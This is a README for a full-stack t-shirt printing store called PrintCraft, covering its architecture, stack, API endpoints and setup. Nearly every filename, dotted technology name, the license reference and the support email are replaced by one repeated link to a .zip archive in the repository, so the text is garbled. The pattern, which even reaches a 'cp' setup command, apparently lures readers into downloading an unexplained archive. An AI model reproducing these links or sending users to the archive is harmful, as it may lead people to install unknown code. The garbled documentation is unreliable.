# PrintCraft - Custom T-Shirt Printing E-commerce Platform

![PrintCraft Logo](https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip)
[![https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip](https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip+-green?style=flat-square)](https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip)
[![React](https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip+-blue?style=flat-square)](https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip)
[![MongoDB](https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip+-green?style=flat-square)](https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip)
[![Express](https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip+-lightgrey?style=flat-square)](https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip)

## 🚀 Project Overview

PrintCraft is a full-stack e-commerce platform specializing in custom t-shirt printing and apparel. The platform allows users to browse products, customize designs, manage orders, and provides comprehensive administrative tools for business management.

## 📊 System Architecture Flowchart

```mermaid
graph TB
    A[Client/Browser] -->|HTTP Requests| B[Frontend - React App]
    B -->|API Calls| C[Backend API - https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip]
    C -->|Authentication| D[JWT Middleware]
    C -->|Data Operations| E[MongoDB Database]
    
    subgraph "Frontend Components"
        B1[Header/Navigation]
        B2[Product Grid]
        B3[Shopping Cart]
        B4[Custom Design Studio]
        B5[User Authentication]
        B6[Admin Panel]
        B --> B1
        B --> B2
        B --> B3
        B --> B4
        B --> B5
        B --> B6
    end
    
    subgraph "Backend Services"
        C1[Auth Routes]
        C2[Product Routes]
        C3[Order Routes]
        C4[Design Routes]
        C5[Admin Routes]
        C --> C1
        C --> C2
        C --> C3
        C --> C4
        C --> C5
    end
    
    subgraph "Database Models"
        E1[User Model]
        E2[Product Model]
        E3[Order Model]
        E4[Design Model]
        E --> E1
        E --> E2
        E --> E3
        E --> E4
    end
    
    subgraph "External Services"
        F[Cloudinary - Image Storage]
        G[Payment Gateway]
        H[Email Service]
    end
    
    C -->|Image Upload| F
    C -->|Payment Processing| G
    C -->|Notifications| H
```

## 🏗️ Technology Stack

### Frontend
- **React 18.3.1** - Component-based UI library
- **React Router DOM 7.6.3** - Client-side routing
- **Vite 5.4.2** - Fast build tool and development server
- **Tailwind CSS 3.4.1** - Utility-first CSS framework
- **Lucide React 0.344.0** - Icon library
- **Axios 1.10.0** - HTTP client for API requests

### Backend
- **https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip** - JavaScript runtime environment
- **https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip 4.21.2** - Web application framework
- **MongoDB with Mongoose 8.3.2** - NoSQL database and ODM
- **JWT (jsonwebtoken 9.0.2)** - Authentication tokens
- **bcryptjs 2.4.3** - Password hashing
- **Cloudinary 2.2.0** - Cloud-based image management
- **Multer 1.4.5** - File upload middleware

### Security & Performance
- **https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip 7.1.0** - Security headers
- **CORS 2.8.5** - Cross-origin resource sharing
- **Express Rate Limit 7.2.0** - API rate limiting
- **dotenv 16.4.5** - Environment variable management

## 📋 Features

### 🛍️ E-commerce Functionality
- **Product Catalog**: Browse various apparel categories (T-shirts, Hoodies, Tank tops, etc.)
- **Size & Color Selection**: Multiple size options (XS-XXXL) and color variants
- **Shopping Cart**: Add/remove items, quantity management
- **Order Management**: Complete order lifecycle with tracking
- **User Profiles**: Customer account management with order history

### 🎨 Custom Design Features
- **Design Studio**: Custom design creation interface (Coming Soon)
- **Image Upload**: Support for custom artwork and logos
- **Design Templates**: Pre-made design options
- **Text Editor**: Custom text with various fonts and styles
- **Print Area Management**: Defined printing zones for each product

### 👥 User Management
- **Authentication System**: Secure login/registration with JWT
- **Role-based Access**: Customer and Admin roles
- **Profile Management**: User details, addresses, and preferences
- **Order Tracking**: Real-time order status updates

### 🔧 Admin Panel
- **Product Management**: CRUD operations for products
- **Order Processing**: Order status updates and management
- **User Administration**: User account management
- **Analytics Dashboard**: Business insights and reporting
- **Inventory Management**: Stock tracking and management

## 📁 Project Structure

```
PrintCraft/
├── 📁 backend/
│   ├── 📁 middleware/
│   │   └── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip                 # JWT authentication middleware
│   ├── 📁 models/
│   │   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip                 # User data model
│   │   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip              # Product data model
│   │   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip                # Order data model
│   │   └── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip               # Design data model
│   ├── 📁 routes/
│   │   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip                 # Authentication endpoints
│   │   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip             # Product management endpoints
│   │   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip               # Order management endpoints
│   │   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip              # Design management endpoints
│   │   └── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip                # Admin panel endpoints
│   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip                # Environment variables template
│   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip                # Backend dependencies
│   └── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip                   # Express server configuration
├── 📁 src/
│   ├── 📁 components/
│   │   ├── 📁 common/
│   │   │   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip          # Navigation component
│   │   │   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip          # Footer component
│   │   │   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip            # Hero section component
│   │   │   └── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip       # Shopping cart popup
│   │   └── 📁 products/
│   │       └── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip     # Product display grid
│   ├── 📁 context/
│   │   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip         # Authentication state management
│   │   └── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip         # Shopping cart state management
│   ├── 📁 pages/
│   │   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip               # Login page
│   │   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip            # Registration page
│   │   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip                # Shopping cart page
│   │   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip       # Product details page
│   │   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip        # Design studio page
│   │   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip              # Order history page
│   │   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip             # User profile page
│   │   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip               # Admin dashboard
│   │   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip               # About page
│   │   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip                 # FAQ page
│   │   └── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip         # How it works page
│   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip                     # Main application component
│   ├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip                    # Application entry point
│   └── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip                   # Global styles
├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip                    # Frontend dependencies
├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip              # Tailwind CSS configuration
├── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip                  # Vite configuration
└── https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip                       # Project documentation
```

## 🗄️ Database Schema

### User Model
- Personal information (firstName, lastName, email)
- Authentication (password with bcrypt hashing)
- Role-based access (customer/admin)
- Address and contact information
- Order references and account status

### Product Model
- Product details (name, description, category)
- Pricing and inventory management
- Size and color variants with stock tracking
- Image gallery and mockup images
- Print area specifications
- Material and care instructions

### Order Model
- Order tracking with unique order numbers
- Item details with customization options
- Shipping and billing information
- Payment processing status
- Order status workflow
- Delivery tracking information

### Design Model
- Custom design metadata
- File storage references
- User associations
- Design specifications

## 🚦 API Endpoints

### Authentication
- `POST /api/auth/register` - User registration
- `POST /api/auth/login` - User login
- `GET /api/auth/profile` - Get user profile
- `PUT /api/auth/profile` - Update user profile

### Products
- `GET /api/products` - Get all products
- `GET /api/products/:id` - Get specific product
- `POST /api/products` - Create product (Admin)
- `PUT /api/products/:id` - Update product (Admin)
- `DELETE /api/products/:id` - Delete product (Admin)

### Orders
- `GET /api/orders` - Get user orders
- `POST /api/orders` - Create new order
- `GET /api/orders/:id` - Get specific order
- `PUT /api/orders/:id` - Update order status

### Designs
- `GET /api/designs` - Get user designs
- `POST /api/designs` - Upload new design
- `GET /api/designs/:id` - Get specific design
- `DELETE /api/designs/:id` - Delete design

### Admin
- `GET /api/admin/users` - Get all users
- `GET /api/admin/orders` - Get all orders
- `PUT /api/admin/orders/:id` - Update order status
- `GET /api/admin/stats` - Get business analytics

## 🛠️ Installation & Setup

### Prerequisites
- https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip 18+
- MongoDB 6+
- npm or yarn package manager

### Backend Setup
```bash
# Navigate to the backend directory
cd backend

# Install dependencies
npm install

# Create environment file
cp https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip .env

# Edit .env with your configuration
# - MONGODB_URI
# - JWT_SECRET
# - CLOUDINARY credentials
# - Other environment variables

# Start the backend server
npm run dev
```

### Frontend Setup
```bash
# Navigate to the root directory
cd PrintCraft

# Install dependencies
npm install

# Start the development server
npm run dev
```

### Environment Variables
Create a `.env` file in the backend directory:
```env
PORT=5000
MONGODB_URI=mongodb://localhost:27017/printcraft
JWT_SECRET=your_super_secret_jwt_key
JWT_EXPIRE=30d
FRONTEND_URL=http://localhost:5173
CLOUDINARY_CLOUD_NAME=your_cloudinary_name
CLOUDINARY_API_KEY=your_cloudinary_key
CLOUDINARY_API_SECRET=your_cloudinary_secret
NODE_ENV=development
```

## 🚀 Deployment

### Production Build
```bash
# Build frontend for production
npm run build

# Start backend in production mode
npm run server
```

### Docker Deployment (Optional)
```dockerfile
# Example Dockerfile structure
FROM node:18-alpine
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production
COPY . .
EXPOSE 5000
CMD ["npm", "start"]
```

## 📈 Future Enhancements

### Planned Features
- [ ] Complete Custom Design Studio implementation
- [ ] Payment gateway integration (Stripe/PayPal)
- [ ] Email notifications and marketing
- [ ] Advanced analytics dashboard
- [ ] Mobile app development
- [ ] AI-powered design recommendations
- [ ] Multi-language support
- [ ] Advanced inventory management
- [ ] Customer reviews and ratings system
- [ ] Social media integration

### Technical Improvements
- [ ] Implement comprehensive testing (Jest, Cypress)
- [ ] Add TypeScript support
- [ ] Implement caching strategies (Redis)
- [ ] Add comprehensive logging system
- [ ] Implement CI/CD pipeline
- [ ] Add monitoring and error tracking
- [ ] Optimize database queries
- [ ] Implement microservices architecture

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

## 📄 License

This project is licensed under the MIT License - see the [https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip](https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip) file for details.

## 👥 Team

- **Development Team**: Full-stack development and architecture
- **UI/UX Design**: User interface and experience design
- **DevOps**: Deployment and infrastructure management

## 📞 Support

For support, email https://raw.githubusercontent.com/SL-junior-coder/PrintCraft/main/viga/PrintCraft.zip or join our Slack channel.

---

**Built with ❤️ by the PrintCraft Team**

*Last updated: January 2025*
